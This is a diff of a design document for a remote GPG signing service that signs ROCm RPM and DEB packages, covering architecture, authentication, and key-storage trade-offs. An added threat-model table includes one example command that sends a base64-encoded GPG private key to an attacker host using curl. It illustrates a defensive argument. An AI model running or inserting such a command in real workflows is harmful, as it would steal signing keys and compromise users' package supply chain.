@@ -1,10 +1,10 @@
 # Signing Server — Detailed Design Document
 
-**Project:** AMD ROCm Build System  
-**Component:** Remote GPG Signing Service  
+**Project:** AMD ROCm Build System
+**Component:** Remote GPG Signing Service
 **Status:** Draft — v0.1
 
----
+______________________________________________________________________
 
 ## 1. Introduction
 
@@ -13,6 +13,7 @@
 TheRock is an open-source CMake super-project that builds HIP and ROCm from source and publishes native Linux packages (RPM and DEB) to an S3-hosted package repository. These packages are installed by end users and automated systems on production hardware.
 
 Enterprise Linux package distribution requires cryptographic signing. GPG-signed packages allow `rpm` and `apt` to verify that:
+
 - The package originated from AMD/ROCm
 - The package has not been modified after publication
 
@@ -22,24 +23,39 @@ Without signing, package managers either refuse to install the packages or prese
 
 GPG signing requires access to a private key. In a CI/CD pipeline, the naive approaches are:
 
-| Approach | Problem |
-|----------|---------|
-| Store private key in GitHub Secrets and import into build runner | Key is exposed in the build environment; any compromise of the runner exposes the key permanently |
-| Sign packages manually offline | Blocks automated release pipelines; does not scale |
-| Skip signing | Packages cannot be distributed through standard package manager channels that require signed metadata |
+| Approach                                                         | Problem                                                                                               |
+| ---------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
+| Store private key in GitHub Secrets and import into build runner | Key is exposed in the build environment; any compromise of the runner exposes the key permanently     |
+| Sign packages manually offline                                   | Blocks automated release pipelines; does not scale                                                    |
+| Skip signing                                                     | Packages cannot be distributed through standard package manager channels that require signed metadata |
 
 A remote signing server solves this by keeping the private key in an isolated, air-gapped environment. Build runners send only the data to be signed and receive back a signature — the key itself never leaves the signing server.
+
+### 1.2a Threat Model — Why Not GitHub Secrets
+
+The "store the key in GitHub Secrets" row in the table above is worth expanding, since it's the alternative most likely to be re-proposed later for its simplicity:
+
+| Scenario                        | Attack path                                                                                                                                                                                                                                       | Impact                                                                                                         |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
+| Collaborator compromise         | A collaborator with workflow-edit access (or a compromised account with that access) modifies a workflow step to exfiltrate the secret (e.g. `curl attacker.com?key=$(base64 <<< "$GPG_PRIVATE_KEY")`)                                            | Complete, permanent key compromise — the key must be rotated and all prior releases' trust re-evaluated        |
+| Self-hosted runner persistence  | Self-hosted runners can have persistent filesystems across jobs. A secret written to disk or left in a process environment during one job may be readable by a later, unrelated job (including a malicious PR's job) scheduled on the same runner | Key theft via temporal proximity, without needing to compromise the workflow that legitimately used the secret |
+| Third-party action supply chain | A workflow step depends on a third-party GitHub Action; if that action's dependency chain is compromised, it can read and exfiltrate any environment variable in the job, including injected secrets                                              | Undetected key theft, since the actual signing workflow's own code is never modified                           |
+
+All three scenarios share a root cause: a GitHub Secret becomes plaintext inside the build runner's process environment at some point, and anything with code-execution in that environment can read it. The remote signing server design in this document does not have this failure mode — the private key never enters the build runner's environment in any form, signed or otherwise; the runner only ever sends data to be signed and receives a signature back.
+
+**Considered and not adopted:** a complementary [Sigstore/Cosign](https://docs.sigstore.dev/) keyless-attestation layer (proving *build provenance* — "this artifact came from this exact workflow run" — independent of GPG's *package-manager compatibility* signing) was evaluated early in this project's design. It was not adopted for this phase because it solves a different problem (provenance/attestation, verified by `cosign verify-blob` against a transparency log) than the one this document addresses (GPG signatures that `rpm`/`apt` can verify natively during install). It remains a reasonable future defense-in-depth addition, layered on top of — not instead of — the GPG signing this document describes.
 
 ### 1.3 Scope
 
 This document covers the design of the remote GPG signing service for ROCm Linux packages. It is scoped to:
+
 - GPG signing of RPM packages and RPM/DEB repository metadata
 - Two authorized caller types: TheRock automated CI builds and authorized operators
 - AWS-hosted infrastructure in a single account
 
 It does not cover: code signing, Windows packages, ELF binary attestation, or cross-account signing.
 
----
+______________________________________________________________________
 
 ## 2. What We Are Building
 
@@ -47,12 +63,12 @@ A remote HTTP signing service running in an AWS private subnet, accepting signed
 
 ### 2.1 What Gets Signed
 
-| Artifact | Signature Format | Produced By | Phase |
-|----------|-----------------|-------------|-------|
-| RPM packages (`.rpm`) | Embedded GPG signature (via `rpmsign`) | `gpgshim` intercepting `rpmsign` on build runner | 1 |
-| RPM repo metadata (`repomd.xml`) | Detached ASCII signature (`repomd.xml.asc`) | `upload_package_repo.py` → `POST /sign` direct | 1 |
-| DEB repo metadata (`Release`) | Clearsigned `InRelease` + detached `Release.gpg` | `upload_package_repo.py` → `POST /sign` direct | 1 |
-| RPM packages, ad-hoc (no gpgshim) | Embedded GPG signature (server-side `rpmsign`) | `POST /sign-rpm` — full RPM uploaded and returned signed | 2 |
+| Artifact                          | Signature Format                                 | Produced By                                              | Phase |
+| --------------------------------- | ------------------------------------------------ | -------------------------------------------------------- | ----- |
+| RPM packages (`.rpm`)             | Embedded GPG signature (via `rpmsign`)           | `gpgshim` intercepting `rpmsign` on build runner         | 1     |
+| RPM repo metadata (`repomd.xml`)  | Detached ASCII signature (`repomd.xml.asc`)      | `upload_package_repo.py` → `POST /sign` direct           | 1     |
+| DEB repo metadata (`Release`)     | Clearsigned `InRelease` + detached `Release.gpg` | `upload_package_repo.py` → `POST /sign` direct           | 1     |
+| RPM packages, ad-hoc (no gpgshim) | Embedded GPG signature (server-side `rpmsign`)   | `POST /sign-rpm` — full RPM uploaded and returned signed | 2     |
 
 DEB package files themselves are not signed — the repository metadata signature is sufficient for `apt`.
 
@@ -60,12 +76,12 @@ DEB package files themselves are not signed — the repository metadata signatur
 
 ### 2.2 Callers
 
-| Caller | Mechanism | Use case |
-|--------|-----------|----------|
-| TheRock CI build (GitHub Actions, self-hosted EC2) | `gpgshim` for RPM signing; `upload_package_repo.py` for metadata | Automated release pipeline |
-| Authorized operator (workstation via VPN) | `sign-file` CLI tool | One-off signing, key verification, emergency re-signing |
+| Caller                                             | Mechanism                                                        | Use case                                                |
+| -------------------------------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------- |
+| TheRock CI build (GitHub Actions, self-hosted EC2) | `gpgshim` for RPM signing; `upload_package_repo.py` for metadata | Automated release pipeline                              |
+| Authorized operator (workstation via VPN)          | `sign-file` CLI tool                                             | One-off signing, key verification, emergency re-signing |
 
----
+______________________________________________________________________
 
 ## 3. Architecture
 
@@ -173,66 +189,66 @@ This diagram shows the complete signing microservice as it looks when all phases
 ╚══════════════════════════════════════════════════════════════════════════════╝
 ```
 
----
+______________________________________________________________________
 
 ### 3.1a Interface Summary
 
-| ID | Interface | Type | Direction | Protocol | Auth | Phase |
-|----|-----------|------|-----------|----------|------|-------|
-| EXT-1 | Build runner → Signing server | External inbound | Inbound | HTTPS POST `/sign` | VPC Security Group (sg-build-runner) | 1 |
-| EXT-2 | Operator → Signing server | External inbound | Inbound | HTTPS POST `/sign` or `/sign-rpm` | VPC Security Group (operator VPN CIDR) | 1 |
-| EXT-1/2 | Any caller → ALB → Signing server | External inbound | Inbound | HTTPS POST, ACM cert | SG + app token header | 2 |
-| EXT-3 | Cross-cloud build runner → API Gateway → VPC Link → NLB → Signing server | External inbound | Inbound | HTTPS POST `/sign`, AWS_IAM auth | AWS SigV4 (IAM role via GitHub OIDC) + API GW resource policy + `authorization.json` `clients` map | 1b |
-| INT-1 | Signing server → Secrets Manager | Internal outbound | Outbound | HTTPS via VPC endpoint | IAM `secretsmanager:GetSecretValue` | 1 |
-| INT-2 | Signing server → KMS | Internal outbound | Outbound | HTTPS via VPC endpoint | IAM `kms:Decrypt` (invoked by SM) | 1 |
-| INT-3 | Signing server → CloudWatch Logs | Internal outbound | Outbound | HTTPS via VPC endpoint | IAM `logs:PutLogEvents` | 1 |
-| INT-4 | Both servers → SM (scheduled sync) | Internal outbound | Outbound | HTTPS via VPC endpoint | IAM `secretsmanager:GetSecretValue` | 2 |
+| ID      | Interface                                                                | Type              | Direction | Protocol                          | Auth                                                                                               | Phase |
+| ------- | ------------------------------------------------------------------------ | ----------------- | --------- | --------------------------------- | -------------------------------------------------------------------------------------------------- | ----- |
+| EXT-1   | Build runner → Signing server                                            | External inbound  | Inbound   | HTTPS POST `/sign`                | VPC Security Group (sg-build-runner)                                                               | 1     |
+| EXT-2   | Operator → Signing server                                                | External inbound  | Inbound   | HTTPS POST `/sign` or `/sign-rpm` | VPC Security Group (operator VPN CIDR)                                                             | 1     |
+| EXT-1/2 | Any caller → ALB → Signing server                                        | External inbound  | Inbound   | HTTPS POST, ACM cert              | SG + app token header                                                                              | 2     |
+| EXT-3   | Cross-cloud build runner → API Gateway → VPC Link → NLB → Signing server | External inbound  | Inbound   | HTTPS POST `/sign`, AWS_IAM auth  | AWS SigV4 (IAM role via GitHub OIDC) + API GW resource policy + `authorization.json` `clients` map | 1b    |
+| INT-1   | Signing server → Secrets Manager                                         | Internal outbound | Outbound  | HTTPS via VPC endpoint            | IAM `secretsmanager:GetSecretValue`                                                                | 1     |
+| INT-2   | Signing server → KMS                                                     | Internal outbound | Outbound  | HTTPS via VPC endpoint            | IAM `kms:Decrypt` (invoked by SM)                                                                  | 1     |
+| INT-3   | Signing server → CloudWatch Logs                                         | Internal outbound | Outbound  | HTTPS via VPC endpoint            | IAM `logs:PutLogEvents`                                                                            | 1     |
+| INT-4   | Both servers → SM (scheduled sync)                                       | Internal outbound | Outbound  | HTTPS via VPC endpoint            | IAM `secretsmanager:GetSecretValue`                                                                | 2     |
 
 **No external outbound interfaces.** The signing server has no internet egress, no public IP, and no access to S3, GitHub, or any service outside the VPC endpoints above.
 
----
+______________________________________________________________________
 
 ### 3.1b What Each Phase Delivers
 
 #### Phase 1 — Working signing pipeline, single server
 
-| Component | What's delivered |
-|-----------|-----------------|
-| Signing server EC2 | Single instance in private subnet, self-signed TLS cert |
-| Access control | VPC Security Groups only — no app-layer auth token |
-| GPG key storage | Secrets Manager + KMS CMK, tmpfs keyring at startup |
-| API | `POST /sign` with tier+artifact (simplified) or legacy key_id params |
-| Clients | `gpgshim` for RPM, `upload_package_repo.py` for metadata, `sign-file` for operators |
-| Rate limiting | Sliding window per source IP |
-| Audit | Structured JSON to stdout → systemd journal (local only) |
-| Observability | `GET /health`, manual `journalctl` inspection |
-| High availability | None — single server; outage blocks signing |
+| Component          | What's delivered                                                                    |
+| ------------------ | ----------------------------------------------------------------------------------- |
+| Signing server EC2 | Single instance in private subnet, self-signed TLS cert                             |
+| Access control     | VPC Security Groups only — no app-layer auth token                                  |
+| GPG key storage    | Secrets Manager + KMS CMK, tmpfs keyring at startup                                 |
+| API                | `POST /sign` with tier+artifact (simplified) or legacy key_id params                |
+| Clients            | `gpgshim` for RPM, `upload_package_repo.py` for metadata, `sign-file` for operators |
+| Rate limiting      | Sliding window per source IP                                                        |
+| Audit              | Structured JSON to stdout → systemd journal (local only)                            |
+| Observability      | `GET /health`, manual `journalctl` inspection                                       |
+| High availability  | None — single server; outage blocks signing                                         |
 
 #### Phase 1b — Cross-cloud client access
 
-| Component | What's added |
-|-----------|-------------|
-| API Gateway | New Regional REST API, `AWS_IAM` auth on `POST /sign`, resource policy allow-listing specific client IAM role ARNs |
-| VPC Link + internal NLB | New, private-only, forwards API Gateway traffic to the unchanged signing server |
-| `gpgshim` | Adds AWS SigV4 request signing (stdlib-only) when `GPG_SIGNING_API_URL` is set; unchanged direct-HTTP path (`GPG_SIGNING_SERVER`) still used by operators |
-| IAM | One new `execute-api:Invoke` permission added to existing per-release-type roles (`therock-ci`, `therock-dev`, `therock-nightly`, `therock-prerelease`) — see open assumption in §4.1b |
-| `authorization.json` | New `clients` map: IAM role name → existing `roles` entry |
-| Signing server | New `--trust-apigw-header` / `TRUST_APIGW_HEADER` flag (default off); reads `X-Signing-Client-Role` header set only by API Gateway's integration mapping |
-| Scope | Covers `ci`/`dev`/`nightly`/`prerelease` tiers; `therock-release` remains manual/operator-only |
+| Component               | What's added                                                                                                                                                                           |
+| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| API Gateway             | New Regional REST API, `AWS_IAM` auth on `POST /sign`, resource policy allow-listing specific client IAM role ARNs                                                                     |
+| VPC Link + internal NLB | New, private-only, forwards API Gateway traffic to the unchanged signing server                                                                                                        |
+| `gpgshim`               | Adds AWS SigV4 request signing (stdlib-only) when `GPG_SIGNING_API_URL` is set; unchanged direct-HTTP path (`GPG_SIGNING_SERVER`) still used by operators                              |
+| IAM                     | One new `execute-api:Invoke` permission added to existing per-release-type roles (`therock-ci`, `therock-dev`, `therock-nightly`, `therock-prerelease`) — see open assumption in §4.1b |
+| `authorization.json`    | New `clients` map: IAM role name → existing `roles` entry                                                                                                                              |
+| Signing server          | New `--trust-apigw-header` / `TRUST_APIGW_HEADER` flag (default off); reads `X-Signing-Client-Role` header set only by API Gateway's integration mapping                               |
+| Scope                   | Covers `ci`/`dev`/`nightly`/`prerelease` tiers; `therock-release` remains manual/operator-only                                                                                         |
 
 #### Phase 2 — Production hardening
 
-| Component | What's added |
-|-----------|-------------|
-| Secondary server | Second EC2 in a different AZ, identical config |
-| ALB | Internal ALB with health checks, auto-failover to secondary |
-| TLS | Self-signed cert replaced by ACM cert on ALB (trusted, no `--no-verify-ssl`) |
-| App-layer auth | Pre-shared token per caller tier stored in Secrets Manager; `Authorization: Bearer` header required |
-| Rate limiting | Keyed by token identifier instead of source IP (accurate per-tier limits) |
-| Scheduled key sync | Background thread re-fetches SM every 6 hours; atomic keyring reload without restart |
-| `POST /sign-rpm` | Server-side RPM signing — accept full RPM, run `rpmsign`, return signed RPM (no gpgshim needed on caller) |
-| CloudWatch | Log agent forwards journal to CloudWatch; alarms on error rate, rate limit hits, health failures |
-| Tokens in SM | `signing/tokens/{dev,nightly,release,operator}` secrets added alongside GPG keys |
+| Component          | What's added                                                                                              |
+| ------------------ | --------------------------------------------------------------------------------------------------------- |
+| Secondary server   | Second EC2 in a different AZ, identical config                                                            |
+| ALB                | Internal ALB with health checks, auto-failover to secondary                                               |
+| TLS                | Self-signed cert replaced by ACM cert on ALB (trusted, no `--no-verify-ssl`)                              |
+| App-layer auth     | Pre-shared token per caller tier stored in Secrets Manager; `Authorization: Bearer` header required       |
+| Rate limiting      | Keyed by token identifier instead of source IP (accurate per-tier limits)                                 |
+| Scheduled key sync | Background thread re-fetches SM every 6 hours; atomic keyring reload without restart                      |
+| `POST /sign-rpm`   | Server-side RPM signing — accept full RPM, run `rpmsign`, return signed RPM (no gpgshim needed on caller) |
+| CloudWatch         | Log agent forwards journal to CloudWatch; alarms on error rate, rate limit hits, health failures          |
+| Tokens in SM       | `signing/tokens/{dev,nightly,release,operator}` secrets added alongside GPG keys                          |
 
 ### 3.2 Request Flow — RPM Package Signing
 
@@ -295,7 +311,7 @@ upload_package_repo.py              Signing Server
          │  write Release.gpg            │
 ```
 
----
+______________________________________________________________________
 
 ## 4. Key Design Decisions
 
@@ -311,7 +327,7 @@ This reasoning holds only while build runners are AWS-native. §4.1b introduces 
 
 **Trade-off acknowledged:** Security Groups control which *instances* can reach the server, not which *processes* on those instances. This is acceptable because the build runner EC2 instances are dedicated to the TheRock CI pipeline.
 
----
+______________________________________________________________________
 
 ### 4.1a Application-Layer Authentication — Three Mechanisms, Two Phases
 
@@ -379,11 +395,11 @@ This is the primary auth mechanism for Phase 2. It is a static opaque string sto
 }
 ```
 
-| Field | Purpose |
-|-------|---------|
-| `token` | The opaque bearer string the caller includes in `Authorization: Bearer <token>` |
-| `client_id` | Identifier written to audit logs — identifies which caller made the request |
-| `role` | Maps to a role in `authorization.json` → determines which keys and rate limits apply |
+| Field       | Purpose                                                                              |
+| ----------- | ------------------------------------------------------------------------------------ |
+| `token`     | The opaque bearer string the caller includes in `Authorization: Bearer <token>`      |
+| `client_id` | Identifier written to audit logs — identifies which caller made the request          |
+| `role`      | Maps to a role in `authorization.json` → determines which keys and rate limits apply |
 
 **Validation (constant-time comparison):**
 
@@ -433,20 +449,21 @@ Rotation:
 
 #### Token Types Compared
 
-| Mechanism | Token source | Secret stored where | Role determined by | Workflow/repo restriction | Suitable for |
-|-----------|-------------|--------------------|--------------------|--------------------------|-------------|
-| **Pre-shared app token** | Generated offline, stored in SM `signing/tokens/*` | SM secret per caller tier (encrypted with KMS CMK) | `role` field in SM token entry | Enforced by IAM (which SM secrets each runner role can read) | Phase 2 primary — simple, no external dependency |
-| **GitHub OIDC** | GitHub Actions OIDC provider, per-job | No stored secret — GitHub-issued, short-lived | Branch ref pattern (`refs/heads/main` → release) | Server enforces: repository, ref, workflow file | CI pipelines with internet access from signing server |
-| **JWT HMAC-SHA256** | `generate-token.py` offline tool | Shared secret in `secrets.json` on server disk | `role` claim in token payload | None — role in token only | Legacy fallback — avoid for new integrations |
+| Mechanism                | Token source                                       | Secret stored where                                | Role determined by                               | Workflow/repo restriction                                    | Suitable for                                          |
+| ------------------------ | -------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------------ | ----------------------------------------------------- |
+| **Pre-shared app token** | Generated offline, stored in SM `signing/tokens/*` | SM secret per caller tier (encrypted with KMS CMK) | `role` field in SM token entry                   | Enforced by IAM (which SM secrets each runner role can read) | Phase 2 primary — simple, no external dependency      |
+| **GitHub OIDC**          | GitHub Actions OIDC provider, per-job              | No stored secret — GitHub-issued, short-lived      | Branch ref pattern (`refs/heads/main` → release) | Server enforces: repository, ref, workflow file              | CI pipelines with internet access from signing server |
+| **JWT HMAC-SHA256**      | `generate-token.py` offline tool                   | Shared secret in `secrets.json` on server disk     | `role` claim in token payload                    | None — role in token only                                    | Legacy fallback — avoid for new integrations          |
 
 #### Why OIDC Is Not the Phase 2 Primary
 
 GitHub OIDC tokens are the most secure option for CI — keyless, short-lived, and carry rich claims (repo, branch, workflow, actor). However they require the signing server to fetch GitHub's public keys from `https://token.actions.githubusercontent.com/.well-known/jwks`. This is an **internet egress call** — incompatible with the air-gapped server design.
 
 Options if OIDC is needed in future:
+
 1. **ALB OIDC offload** — ALB validates the OIDC token and injects a verified identity header before forwarding. Server trusts the header, no direct GitHub call needed.
-2. **Relay service** — A lightweight non-air-gapped service validates the OIDC token and exchanges it for a pre-shared app token.
-3. **Relax egress** — Add a NAT rule allowing outbound HTTPS to `token.actions.githubusercontent.com` only. Breaks the full air-gap but is scoped.
+1. **Relay service** — A lightweight non-air-gapped service validates the OIDC token and exchanges it for a pre-shared app token.
+1. **Relax egress** — Add a NAT rule allowing outbound HTTPS to `token.actions.githubusercontent.com` only. Breaks the full air-gap but is scoped.
 
 #### Workflow and Repository-Level Restrictions (OIDC)
 
@@ -497,6 +514,7 @@ Example `authorization.json` OIDC role mapping:
 ```
 
 This means:
+
 - A PR branch (`refs/pull/*`) can only get the dev key — never release
 - A fork of TheRock (`contributor/TheRock`) is rejected even with a valid OIDC token
 - A different workflow file (e.g. a manually triggered `sign-all.yml`) is rejected
@@ -530,6 +548,8 @@ Every signing request logs `auth_type` so the audit trail captures how each requ
 
 OIDC entries additionally include `repository`, `ref`, `workflow`, `actor`, `run_id`, and `event_name` from the token claims — giving a full CI context audit trail at no extra cost.
 
+**Noted future enhancement:** the current audit schema (`auth.py::audit_log()`) does not capture a `package_name` or `package_hash` (SHA256 of the signed artifact) — it logs the requested `key_id`/`digest_algo` but not an identifier for *which specific artifact* was signed. Adding these (the caller already computes the artifact's hash; it could be included as an optional field in the `/sign` request purely for audit purposes, without changing the signing logic) would let an auditor answer "which package did this specific signing event produce" directly from the log, rather than only "when a given key/tier was used." Not required for Phase 1/1b; worth considering if package-level audit traceability becomes a requirement.
+
 ### 4.1b Cross-Cloud Client Access (Phase 1b)
 
 #### Problem
@@ -537,6 +557,7 @@ OIDC entries additionally include `repository`, `ref`, `workflow`, `actor`, `run
 Section 4.1's Security-Group-only model assumes every build runner is an AWS instance. Build runners may run on Azure instead — an Azure VM cannot be a member of an AWS Security Group, and there is no cross-cloud equivalent without a permanent VPN/interconnect between the two clouds.
 
 Rejected alternatives:
+
 - AWS-Azure VPN/interconnect — heavy, a new permanent attack surface, doesn't scale to additional clouds.
 - Expose the signing server directly to the internet (even behind mTLS) — breaks the air-gap principle Section 4.1/Section 8 depend on.
 - A dedicated "signing workflow" proxy job on new AWS compute — viable, but requires standing up and securing new runner infrastructure plus custom OIDC-validation code to write and maintain ourselves.
@@ -570,11 +591,11 @@ This mirrors the industry-standard shape for "heterogeneous CI needs to reach a 
 
 #### Three-layer access model
 
-| Layer | Question answered | Where enforced |
-|---|---|---|
-| IAM trust policy (existing, unchanged) | Can this repo/ref even get AWS credentials? | AWS IAM |
+| Layer                                                    | Question answered                                | Where enforced        |
+| -------------------------------------------------------- | ------------------------------------------------ | --------------------- |
+| IAM trust policy (existing, unchanged)                   | Can this repo/ref even get AWS credentials?      | AWS IAM               |
 | IAM permission (new) + API Gateway resource policy (new) | Can this credential call the signing API at all? | AWS IAM / API Gateway |
-| `authorization.json` `clients` map (new) | What key/tier can this specific caller use? | signing server config |
+| `authorization.json` `clients` map (new)                 | What key/tier can this specific caller use?      | signing server config |
 
 `clients` maps a normalized IAM role name to an entry in the existing `roles` block — no duplication of key/tier policy, purely an identity-to-role binding:
 
@@ -609,7 +630,7 @@ In Phase 1, clients connect to the primary directly by private IP. In Phase 2, a
 
 Three approaches were evaluated for storing and protecting the GPG private key in AWS. This section documents all three, their trade-offs, and the rationale for the chosen approach.
 
----
+______________________________________________________________________
 
 #### Option 1 — KMS Asymmetric Key (private key lives inside KMS hardware)
 
@@ -625,21 +646,21 @@ AWS KMS HSM  ← private key never leaves
 Build Runner  →  raw signature bytes
 ```
 
-| Aspect | Detail |
-|--------|--------|
-| **Private key ever on disk** | Never |
-| **Private key ever in RAM** | Never |
-| **GPG / OpenPGP compatible** | ❌ No — KMS returns raw RSA/ECDSA bytes, not OpenPGP packet format |
-| **Works with rpm --checksig** | ❌ Fails — RPM expects OpenPGP signature packets |
-| **Works with apt verify** | ❌ Fails — same reason |
-| **Operational complexity** | Low |
-| **Monthly cost** | Low — pay per API call |
-| **FIPS 140-2 Level 3** | ✅ Yes |
-| **Instant revocation** | ✅ Disable CMK |
+| Aspect                        | Detail                                                             |
+| ----------------------------- | ------------------------------------------------------------------ |
+| **Private key ever on disk**  | Never                                                              |
+| **Private key ever in RAM**   | Never                                                              |
+| **GPG / OpenPGP compatible**  | ❌ No — KMS returns raw RSA/ECDSA bytes, not OpenPGP packet format |
+| **Works with rpm --checksig** | ❌ Fails — RPM expects OpenPGP signature packets                   |
+| **Works with apt verify**     | ❌ Fails — same reason                                             |
+| **Operational complexity**    | Low                                                                |
+| **Monthly cost**              | Low — pay per API call                                             |
+| **FIPS 140-2 Level 3**        | ✅ Yes                                                             |
+| **Instant revocation**        | ✅ Disable CMK                                                     |
 
 **Why rejected:** KMS asymmetric signing produces raw cryptographic signatures. `rpm --checksig`, `gpg --verify`, and `apt` all require OpenPGP-format signatures (`-----BEGIN PGP SIGNATURE-----`). Bridging the gap would require reimplementing the OpenPGP packet format — effectively rewriting part of GPG. Not viable for standard package distribution.
 
----
+______________________________________________________________________
 
 #### Option 2 — AWS CloudHSM + PKCS#11 GPG Engine
 
@@ -660,21 +681,21 @@ GPG wraps into OpenPGP packet format
 Valid .asc signature  ✅
 ```
 
-| Aspect | Detail |
-|--------|--------|
-| **Private key ever on disk** | Never |
-| **Private key ever in RAM** | Never (HSM signs internally) |
-| **GPG / OpenPGP compatible** | ✅ Yes — PKCS#11 engine + GPG produces standard OpenPGP |
-| **Works with rpm --checksig** | ✅ Yes |
-| **Works with apt verify** | ✅ Yes |
-| **Operational complexity** | High — PKCS#11 driver, CloudHSM cluster management, custom AMI |
-| **Monthly cost** | ~$1,100+ (2× HSM at $1.50/hour for HA, minimum 2 required) |
-| **FIPS 140-2 Level 3** | ✅ Yes — certified |
-| **Instant revocation** | ✅ Delete key from HSM |
+| Aspect                        | Detail                                                         |
+| ----------------------------- | -------------------------------------------------------------- |
+| **Private key ever on disk**  | Never                                                          |
+| **Private key ever in RAM**   | Never (HSM signs internally)                                   |
+| **GPG / OpenPGP compatible**  | ✅ Yes — PKCS#11 engine + GPG produces standard OpenPGP        |
+| **Works with rpm --checksig** | ✅ Yes                                                         |
+| **Works with apt verify**     | ✅ Yes                                                         |
+| **Operational complexity**    | High — PKCS#11 driver, CloudHSM cluster management, custom AMI |
+| **Monthly cost**              | ~$1,100+ (2× HSM at $1.50/hour for HA, minimum 2 required)     |
+| **FIPS 140-2 Level 3**        | ✅ Yes — certified                                             |
+| **Instant revocation**        | ✅ Delete key from HSM                                         |
 
 **Why not chosen (now):** CloudHSM is the only approach that gives HSM-level protection AND GPG compatibility. However, the cost ($1,100+/month) and operational complexity (PKCS#11 setup, cluster management, custom AMI) are not justified by the current threat model. **Captured as the upgrade path if a FIPS 140-2 Level 3 compliance requirement is introduced.**
 
----
+______________________________________________________________________
 
 #### Option 3 — AWS Secrets Manager + KMS CMK (chosen)
 
@@ -702,35 +723,35 @@ Server startup (every restart):
   3. unset KEY  ← plaintext gone from memory
 ```
 
-| Aspect | Detail |
-|--------|--------|
-| **Private key ever on disk** | As AES-256 ciphertext only — useless without KMS CMK access |
-| **Private key ever in RAM** | Yes — briefly during `GetSecretValue` response and `gpg --import` |
-| **GPG / OpenPGP compatible** | ✅ Yes — standard GPG, no special drivers |
-| **Works with rpm --checksig** | ✅ Yes |
-| **Works with apt verify** | ✅ Yes |
-| **Operational complexity** | Low — standard `boto3` + `gpg --import` |
-| **Monthly cost** | ~$2 (Secrets Manager $0.40/secret + KMS $1/CMK + API calls) |
-| **FIPS 140-2 Level 3** | ❌ Not certified |
-| **Instant revocation** | ✅ Disable CMK — all future `GetSecretValue` calls fail immediately |
+| Aspect                        | Detail                                                              |
+| ----------------------------- | ------------------------------------------------------------------- |
+| **Private key ever on disk**  | As AES-256 ciphertext only — useless without KMS CMK access         |
+| **Private key ever in RAM**   | Yes — briefly during `GetSecretValue` response and `gpg --import`   |
+| **GPG / OpenPGP compatible**  | ✅ Yes — standard GPG, no special drivers                           |
+| **Works with rpm --checksig** | ✅ Yes                                                              |
+| **Works with apt verify**     | ✅ Yes                                                              |
+| **Operational complexity**    | Low — standard `boto3` + `gpg --import`                             |
+| **Monthly cost**              | ~$2 (Secrets Manager $0.40/secret + KMS $1/CMK + API calls)         |
+| **FIPS 140-2 Level 3**        | ❌ Not certified                                                    |
+| **Instant revocation**        | ✅ Disable CMK — all future `GetSecretValue` calls fail immediately |
 
----
+______________________________________________________________________
 
 #### Comparison Summary
 
-| | KMS Asymmetric | CloudHSM + PKCS#11 | **Secrets Manager + CMK** |
-|--|---------------|-------------------|--------------------------|
-| **Private key ever on disk** | Never | Never | Encrypted ciphertext only |
-| **Private key ever in RAM** | Never | Never | Yes — during startup import |
-| **GPG / OpenPGP compatible** | ❌ | ✅ | ✅ |
-| **Works with rpm / apt** | ❌ | ✅ | ✅ |
-| **Operational complexity** | Low | High | **Low** |
-| **Monthly cost (approx.)** | Low | ~$1,100+ | **~$2** |
-| **FIPS 140-2 Level 3** | ✅ | ✅ | ❌ |
-| **Instant revocation** | ✅ | ✅ | **✅** |
-| **Audit trail** | CloudTrail | CloudHSM logs + CloudTrail | **CloudTrail** |
+|                              | KMS Asymmetric | CloudHSM + PKCS#11         | **Secrets Manager + CMK**   |
+| ---------------------------- | -------------- | -------------------------- | --------------------------- |
+| **Private key ever on disk** | Never          | Never                      | Encrypted ciphertext only   |
+| **Private key ever in RAM**  | Never          | Never                      | Yes — during startup import |
+| **GPG / OpenPGP compatible** | ❌             | ✅                         | ✅                          |
+| **Works with rpm / apt**     | ❌             | ✅                         | ✅                          |
+| **Operational complexity**   | Low            | High                       | **Low**                     |
+| **Monthly cost (approx.)**   | Low            | ~$1,100+                   | **~$2**                     |
+| **FIPS 140-2 Level 3**       | ✅             | ✅                         | ❌                          |
+| **Instant revocation**       | ✅             | ✅                         | **✅**                      |
+| **Audit trail**              | CloudTrail     | CloudHSM logs + CloudTrail | **CloudTrail**              |
 
----
+______________________________________________________________________
 
 #### Decision: Secrets Manager + KMS CMK
 
@@ -738,7 +759,7 @@ Server startup (every restart):
 
 **Upgrade path to CloudHSM:** If a FIPS 140-2 Level 3 compliance requirement is introduced, only the key loading code in `signing-server.py` changes — the rest of the pipeline (gpgshim, upload_package_repo.py, GitHub Actions workflow) is completely unaffected.
 
----
+______________________________________________________________________
 
 #### Threat Coverage with Chosen Approach
 
@@ -746,33 +767,33 @@ Security controls operate at two distinct layers. It is important to understand 
 
 **Layer 1 — Key at rest and in distribution (KMS + Secrets Manager)**
 
-| Threat | What attacker gets | Protected by |
-|--------|-------------------|-------------|
-| Raw access to AWS Secrets Manager storage | AES-256 ciphertext — useless without CMK | KMS CMK |
-| Secrets Manager API call without server role | `GetSecretValue` denied by resource policy | IAM resource policy |
-| IAM credential theft (non-server role) | Cannot call `GetSecretValue` | IAM resource policy |
-| IAM credential theft (server role) | Gets plaintext key via `GetSecretValue` | CloudTrail alarm — detected, not prevented |
-| EBS snapshot of signing server volume | tmpfs is RAM-only — not in EBS snapshot | tmpfs mount |
-| AWS insider accesses Secrets Manager storage | AES-256 ciphertext only | KMS CMK |
-| Key distributed via insecure channel (scp, ansible) | N/A — Secrets Manager is the only distribution path | SM architecture |
+| Threat                                              | What attacker gets                                  | Protected by                               |
+| --------------------------------------------------- | --------------------------------------------------- | ------------------------------------------ |
+| Raw access to AWS Secrets Manager storage           | AES-256 ciphertext — useless without CMK            | KMS CMK                                    |
+| Secrets Manager API call without server role        | `GetSecretValue` denied by resource policy          | IAM resource policy                        |
+| IAM credential theft (non-server role)              | Cannot call `GetSecretValue`                        | IAM resource policy                        |
+| IAM credential theft (server role)                  | Gets plaintext key via `GetSecretValue`             | CloudTrail alarm — detected, not prevented |
+| EBS snapshot of signing server volume               | tmpfs is RAM-only — not in EBS snapshot             | tmpfs mount                                |
